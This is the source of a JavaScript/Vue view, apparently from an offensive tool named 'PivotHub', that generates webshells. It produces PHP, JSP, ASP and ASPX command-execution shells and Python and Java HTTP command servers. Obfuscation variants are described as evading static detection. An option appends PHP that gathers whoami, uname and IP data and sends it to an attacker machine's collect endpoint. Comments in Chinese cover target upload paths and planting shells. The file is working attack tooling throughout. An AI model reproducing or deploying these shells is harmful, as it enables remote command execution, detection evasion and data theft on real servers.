/* ============================================================
   Webshell 生成器视图 — 一句话马 / 自定义马 / 混淆模板 / 写马姿势
   ============================================================ */
(function (global) {
  'use strict';
  const { reactive, computed } = Vue;
  const S = PivotStore;

  function phpOneShell(p) { return "<?php @eval($_POST['" + p + "']);?>"; }
  function jspOneShell() {
    return '<%@ page import="java.util.*,java.io.*" %>\n' +
      '<%\n' +
      '    String cmd = request.getParameter("cmd");\n' +
      '    if (cmd != null) {\n' +
      '        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});\n' +
      '        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n' +
      '        String line;\n' +
      '        while ((line = br.readLine()) != null) out.println(line);\n' +
      '    }\n' +
      '%>';
  }
  function aspOneShell(p) { return '<%eval request("" + p + "")%>'; }

  /* 【A5】Python 命令回显端点：纯标准库，python3 shell.py 即可起。
     协议：GET/POST ?<param>=<命令> → 响应体为命令输出（与 session 的 python/cmdhttp 驱动对齐）。 */
  function pythonEchoShell(p) {
    return '#!/usr/bin/env python3\n' +
      '# PivotHub 命令回显端点（纯标准库，无需 pip）\n' +
      '# 用法: python3 ' + 'shell.py' + '   [PORT 环境变量可改，默认 8000]\n' +
      'import os, subprocess\n' +
      'from http.server import BaseHTTPRequestHandler, HTTPServer\n' +
      'from urllib.parse import urlparse, parse_qs\n' +
      '\n' +
      'PARAM = "' + p + '"\n' +
      'PORT = int(os.environ.get("PORT", "8000"))\n' +
      '\n' +
      'class H(BaseHTTPRequestHandler):\n' +
      '    def _run(self):\n' +
      '        q = parse_qs(urlparse(self.path).query)\n' +
      '        cmd = (q.get(PARAM) or [""])[0]\n' +
      '        if not cmd and self.command == "POST":\n' +
      '            n = int(self.headers.get("Content-Length") or 0)\n' +
      '            cmd = parse_qs(self.rfile.read(n).decode("utf-8", "replace")).get(PARAM, [""])[0]\n' +
      '        body = b""\n' +
      '        if cmd:\n' +
      '            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n' +
      '            body = r.stdout or b""\n' +
      '        self.send_response(200)\n' +
      '        self.send_header("Content-Type", "text/plain; charset=utf-8")\n' +
      '        self.send_header("Content-Length", str(len(body)))\n' +
      '        self.end_headers()\n' +
      '        self.wfile.write(body)\n' +
      '\n' +
      '    do_GET = _run\n' +
      '    do_POST = _run\n' +
      '\n' +
      '    def log_message(self, *a):\n' +
      '        pass\n' +
      '\n' +
      'HTTPServer(("0.0.0.0", PORT), H).serve_forever()\n';
  }

  /* 【A5】Java 命令回显端点：JDK 内置 HttpServer，java Shell.java <port> 单文件直跑。
     适用拿不到 JSP 落地能力、但能执行 java 的场景（如 Solr 类 Java 服务）。 */
  function javaEchoShell(p) {
    return '// PivotHub 命令回显端点 · 单文件运行: java Shell.java [端口，默认 8000]\n' +
      'import com.sun.net.httpserver.HttpServer;\n' +
      'import java.io.OutputStream;\n' +
      'import java.net.InetSocketAddress;\n' +
      'import java.net.URLDecoder;\n' +
      'import java.nio.charset.StandardCharsets;\n' +
      '\n' +
      'public class Shell {\n' +
      '    static final String PARAM = "' + p + '";\n' +
      '\n' +
      '    public static void main(String[] args) throws Exception {\n' +
      '        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8000;\n' +
      '        HttpServer srv = HttpServer.create(new InetSocketAddress(port), 0);\n' +
      '        srv.createContext("/", ex -> {\n' +
      '            String q = ex.getRequestURI().getRawQuery();\n' +
      '            String cmd = "";\n' +
      '            if (q != null) {\n' +
      '                for (String kv : q.split("&")) {\n' +
      '                    String[] kvp = kv.split("=", 2);\n' +
      '                    if (kvp.length == 2 && kvp[0].equals(PARAM)) {\n' +
      '                        cmd = URLDecoder.decode(kvp[1], "UTF-8");\n' +
      '                    }\n' +
      '                }\n' +
      '            }\n' +
      '            String out;\n' +
      '            try {\n' +
      '                ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", cmd);\n' +
      '                pb.redirectErrorStream(true);\n' +
      '                Process pr = pb.start();\n' +
      '                out = new String(pr.getInputStream().readAllBytes(), StandardCharsets.UTF_8);\n' +
      '            } catch (Exception e) {\n' +
      '                out = "ERR " + e.getMessage();\n' +
      '            }\n' +
      '            byte[] b = out.getBytes(StandardCharsets.UTF_8);\n' +
      '            ex.sendResponseHeaders(200, b.length);\n' +
      '            OutputStream os = ex.getResponseBody();\n' +
      '            os.write(b);\n' +
      '            os.close();\n' +
      '        });\n' +
      '        srv.start();\n' +
      '    }\n' +
      '}\n';
  }
  function aspxOneShell(p) {
    return '<%@ Page Language="C#" %>\n' +
      '<% System.Diagnostics.Process p = new System.Diagnostics.Process();\n' +
      '   p.StartInfo.FileName = "cmd.exe";\n' +
      '   p.StartInfo.Arguments = "/c " + Request["' + p + '"];\n' +
      '   p.StartInfo.UseShellExecute = false;\n' +
      '   p.StartInfo.RedirectStandardOutput = true;\n' +
      '   p.Start();\n' +
      '   Response.Write(p.StandardOutput.ReadToEnd()); %>';
  }

  const BUILDS = {
    PHP: (f) => {
      const base = f.kind === 'oneshell'
        ? phpOneShell(f.param)
        : "<?php\n" +
          "// PivotHub 自定义马 · AES-128-CBC 加密通信\n" +
          "$k = '" + f.key + "';\n" +
          "$d = openssl_decrypt(base64_decode($_POST['data']), 'AES-128-CBC', $k, 0, substr(md5($k), 0, 16));\n" +
          "if ($d) { $p = json_decode($d, true); echo base64_encode(openssl_encrypt(shell_exec($p['cmd']), 'AES-128-CBC', $k, 0, substr(md5($k), 0, 16))); }\n" +
          "?>";
      return obfuscate(f, base, 'php');
    },
    JSP: (f) => obfuscate(f, jspOneShell(), 'jsp'),
    ASP: (f) => obfuscate(f, aspOneShell(f.param), 'asp'),
    ASPX: (f) => obfuscate(f, aspxOneShell(f.param), 'aspx'),
    /* 【A5】命令回显端点形态：目标落不下一句话马时（Flask/Solr/任意 Java）用它承载会话 */
    PYTHON: (f) => pythonEchoShell(f.param),
    JAVA: (f) => javaEchoShell(f.param),
  };

  function obfuscate(f, code, lang) {
    let out = code;
    if (f.obf === 'concat') {
      if (lang === 'php') {
        out = "<?php\n$a='ev'; $b='al'; $c='$_PO'+'ST';\n" + code.replace('<?php', '').replace('?>', '') +
          "\n// 字符串拼接变体，规避静态特征\n?>";
      } else if (lang === 'jsp') {
        out = code.replace('Runtime.getRuntime()', 'Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)');
      } else {
        out = code.replace(/request\(/g, 'req' + 'uest(');
      }
    } else if (f.obf === 'assert') {
      if (lang === 'php') {
        out = "<?php\n$f = 'assert';\n$f(base64_decode($_POST['" + f.param + "']));\n?>";
      } else out = code;
    } else if (f.obf === 'param') {
      out = code.replace(f.param, 'p' + Math.random().toString(36).slice(2, 6)) +
        (lang === 'php' ? "\n// 参数名随机化 + 请求头指纹校验\nif (($_SERVER['HTTP_X_ID'] ?? '') !== 'pivothub') { http_response_code(404); exit; }" : '');
    } else if (f.obf === 'base64') {
      if (lang === 'php') {
        out = "<?php\n$payload = base64_decode('" + btoa(phpOneShell(f.param)) + "');\neval(substr($payload, 5));\n?>";
      } else out = code;
    }
    if (f.autoCollect && lang === 'php') {
      /* ⚠️ 修正：原先硬编码 http://127.0.0.1:8000/api/collect —— 远程靶机永远打不回面板，
         而且每次命令执行都附带一次无效外联。这里改用「全局设置」里的攻击机地址。 */
      const atk = (S.state.attack && S.state.attack.ip) || '';
      const panel = atk ? ('http://' + atk + ':8000') : '';
      if (panel) {
        out += "\n<?php\n// 连接后自动回传基础信息（whoami/uname/ip/网卡）\n" +
          "$info = ['whoami' => trim(shell_exec('whoami')), 'uname' => trim(shell_exec('uname -a')), 'ip' => gethostbyname(gethostname())];\n" +
          "@file_get_contents('" + panel + "/api/collect?d=' . base64_encode(json_encode($info)));\n?>";
      } else {
        out += "\n<?php\n// 未配置攻击机地址（全局设置），已省略自动回传代码——避免打向 127.0.0.1 产生无效外联\n?>";
      }
    }
    return out;
  }

  global.Components['generator-view'] = {
    name: 'GeneratorView',
    template: '#tpl-generator',
    setup() {
      const form = reactive({
        lang: 'PHP', kind: 'oneshell', param: 'cmd', key: 'PivotHub2026Key!',
        obf: 'none', autoCollect: true,
      });
      const langs = ['PHP', 'JSP', 'ASP', 'ASPX', 'PYTHON', 'JAVA'];
      const code = computed(() => (BUILDS[form.lang] ? BUILDS[form.lang](form) : ''));
      /* code 为 computed，表单变化自动重建；build() 供模板显式调用（保持语义） */
      function build() { /* no-op：依赖 computed 自动更新 */ }
      const filename = computed(() => {
        const ext = { PHP: 'php', JSP: 'jsp', ASP: 'asp', ASPX: 'aspx', PYTHON: 'py', JAVA: 'java' }[form.lang];
        return 'shell.' + ext;
      });

      const tips = reactive(S.state.injectTips);

      function render(tpl, hostId) {
        const h = S.hostOf(hostId) || {};
        const seg = (h.segment || '10.85.101.0/24').split('.').slice(0, 3).join('.');
        const ip = h.ip || '10.85.101.4';
        /* 只取常见 Web 端口，避免把 53/88/389/445 这类服务端口当成 URL 端口 */
        const WEB_PORTS = [80, 8080, 8000, 8888, 443, 8443, 3000, 5000];
        const port = (h.ports || []).find((p) => WEB_PORTS.includes(p)) || 80;
        /* 按目标 OS / 端口推导落盘路径与马文件名 */
        const isWin = /windows/i.test(h.os || '');
        const file = isWin ? 'shell.aspx' : (/jsp|tomcat/i.test(h.os || '') ? 'shell.jsp' : 'shell.php');
        const path = isWin ? 'C:\\inetpub\\wwwroot\\' : (/tomcat/i.test(h.os || '') ? '/usr/local/tomcat/webapps/ROOT/' : '/var/www/html/upload/');
        const url = 'http://' + ip + (port && port !== 80 ? ':' + port : '') + '/';
        return String(tpl)
          .replace(/\{IP\}/g, ip)
          .replace(/\{HOST\}/g, h.hostname || 'target')
          .replace(/\{URL\}/g, url)
          .replace(/\{PARAM\}/g, 'id')
          .replace(/\{SEG\}/g, seg)
          .replace(/\{PATH\}/g, path)
          .replace(/\{FILE\}/g, file)
          .replace(/\{DOMAIN\}/g, 'supercorp.local')
          .replace(/\{USER\}/g, 'svc_web')
          .replace(/\{PASS\}/g, 'P@ssw0rd2026!')
          .replace(/\{HASH\}/g, '8f3c1c2f9c1a...')
          .replace(/\{PUBKEY\}/g, 'ssh-rsa AAAAB3Nza...pivothub');
      }
      /* 返回该 payload 里被替换掉的变量名，用于提示「已替换」 */
      function replacedVars(tpl) {
        const found = String(tpl).match(/\{[A-Z]+\}/g) || [];
        return Array.from(new Set(found));
      }
      function copy(t) { S.copy(t); }
      function download() { S.download(filename.value, code.value); }
      function tryInject(t) {
        /* 结果只能来自真实执行，这里只给操作指引 */
        S.toast('写马姿势已生成：请在目标上手动执行，或用 Shell 管理里的虚拟终端发送', 'info');
      }

      return {
        form, langs, code, filename, tips,
        hosts: S.state.hosts,
        icon: global.icon,
        build, render, replacedVars, copy, download, tryInject,
      };
    },
  };
})(window);
